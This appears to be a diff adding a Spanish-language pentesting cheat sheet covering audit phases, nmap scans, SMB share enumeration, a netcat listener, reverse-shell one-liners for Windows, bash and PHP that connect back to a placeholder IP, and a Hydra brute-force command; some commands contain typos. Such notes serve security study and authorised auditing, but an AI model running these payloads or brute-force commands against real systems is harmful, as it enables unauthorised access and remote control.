@@ -1,0 +1,125 @@
+﻿# FASE DE LA AUDITORÍA 
+
+# RECONOCIMIENTO            Recopilar información
+# ENUMERACIÓN               Escaneo de puertos, análisis de vulnerabilidades
+# EXPLOTACIÓN               Acceso al sistema, escalada de privilegios
+# POST EXPLOTACIÓN          Persistencia
+# EPORTES, INFORMES         Redacción de informes
+
+
+# FASE DE ENUMERACIÓN
+
+# NMAP
+
+nmap [options]
+
+-p     	       # Para indicar un puerto.
+-p1-100	       # Escanea un rango de puertos.
+-p-    	       # Para indicar todos los puertos.
+--open         # Para indicar puertos abiertos.
+-sS            # Hace un escaneo sigiloso.
+-T5       	   # Hacer un escaneo agresivo.
+-n     	       # No aplica la resolución DNS.
+-Pn        	   # Para que no aplique un ping
+-v         	   # Para mostrar info por consola
+-O        	   # Para indicar que S.O está usando.
+-sV       	   # Para indicar el servicio y la versión.
+-sC      	   # Para aplicar un script para encontrar vulnerabilidades.
+-oN {.txt}     # Para guardar escaneos en un archivo de texto plano.
+-sn            # Para hacer un escaneo de redes
+-sn [IP/24]    # Para listar todos los dispositivos de red,
+-sP [IP]       #
+
+# Comandos 
+
+nmap -p- --open -sS T5 -vvv -n -Pn  [ip] -oN scanports.txt
+
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn  [ip] -oN scanports.txt
+
+nmap -p  -sV -sC -O   [ip] -oN scansv.txt 
+
+nmap -p  -sCV - O  [ip] -oN scansv.txt 
+
+
+# Protocolo  SMB  PUERTO 445
+
+# CRACKMAPEXEC 
+
+crackmapexec smb <IP>
+
+smbmap -H <IP> -u ‘user’  -p ‘pass’
+
+smbmap -H <IP> -u 'null'
+
+smbmap -H <IP> -r /share
+
+smbclient  //IP/ -U %pass
+
+smbclient -L  //IP -N
+
+smbclient -N//IP/share 
+
+
+# FASE DE  EXPLOTACIÓN 
+
+
+# NETCAT 
+
+sudo apt install rlwrap 
+
+sudo apt install netcat  
+
+sudo rlwrap nc -lvnp <port>      # Ponerse por escucha por un puerto 
+
+# Pyload
+
+nc.exe -e cmd.exe <IP> <port>            # Pyload para Windows
+
+/bin/bash -i >& /dev/tcp/IP/[port] 0>&1  # Pyload para linux en bash
+
+php -r '$sock=fsockopen("<IP>",<port>);exec("/bin/bash -i<&3 >&3 2>&3");' # Pyload en php
+
+
+# Hydra - Fuerza Bruta
+
+
+hydra -l user -P /usr/share/wordlists/rokyou.txt protocolo://IP
+
+
+
+https://sckull.github.io/categories/windows/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+- burp suite
+- hydra
+- sqlmap
+- wfuzz
+
+
+
+
+
